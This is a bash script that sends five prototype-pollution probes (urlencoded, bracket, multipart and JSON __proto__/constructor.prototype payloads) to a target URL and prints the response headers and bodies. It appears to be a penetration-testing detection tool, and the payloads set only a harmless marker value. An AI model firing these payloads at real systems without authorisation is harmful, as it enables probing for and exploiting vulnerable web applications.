#!/usr/bin/env bash
set -euo pipefail

# Usage: ./prototype-pollution-probes.sh https://target/path
# Sends common form/body prototype-pollution probes and prints headers/body snippets.

URL=${1:?usage: $0 URL}

probe() {
  local label=$1
  shift
  echo "===== $label ====="
  curl -sk -i "$@" "$URL" | sed -n '1,40p'
  echo
}

probe 'urlencoded __proto__.pp_test' \
  -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data '__proto__.pp_test=YES_FROM_PROTO'

probe 'urlencoded constructor.prototype.pp_test' \
  -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'constructor.prototype.pp_test=YES_FROM_CTOR'

probe 'bracket __proto__[pp_test]' \
  -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data '__proto__[pp_test]=YES_FROM_BRACKET'

probe 'multipart __proto__.pp_test' \
  -X POST -F '__proto__.pp_test=YES_FROM_MULTIPART'

probe 'json __proto__ object' \
  -X POST -H 'Content-Type: application/json' \
  --data '{"__proto__":{"pp_test":"YES_FROM_JSON"}}'
